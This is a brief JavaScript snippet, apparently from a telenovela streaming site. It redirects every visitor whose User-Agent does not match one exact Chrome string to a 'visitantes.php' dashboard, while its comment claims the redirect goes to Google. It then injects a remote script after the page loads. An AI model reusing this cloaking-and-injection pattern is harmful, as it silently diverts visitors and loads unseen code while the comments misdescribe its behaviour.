(function() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;

    // Verificar si el User-Agent contiene exactamente la cadena específica enviada por el servidor
    if (!/Mozilla\/5\.0 \(Windows NT 10\.0; Win64; x64\) AppleWebKit\/537\.36 \(KHTML, like Gecko\) Chrome\/93\.0\.4577\.63 Safari\/537\.36/i.test(userAgent)) {
        // Si no contiene la cadena exacta, redirige a Google
        window.location.href = "https://superseriesnovelas.online/dashboard/app/visitantes.php";
    }
})();

//<![CDATA[
// Say Hi to Adblock
function downloadJSAtOnload(){var e=document.createElement("script");e.src="https://superseriesnovelas.online/recursos/hs.js",document.body.appendChild(e)}window.addEventListener?window.addEventListener("load",downloadJSAtOnload,!1):window.attachEvent?window.attachEvent("onload",downloadJSAtOnload):window.onload=downloadJSAtOnload;
//]]>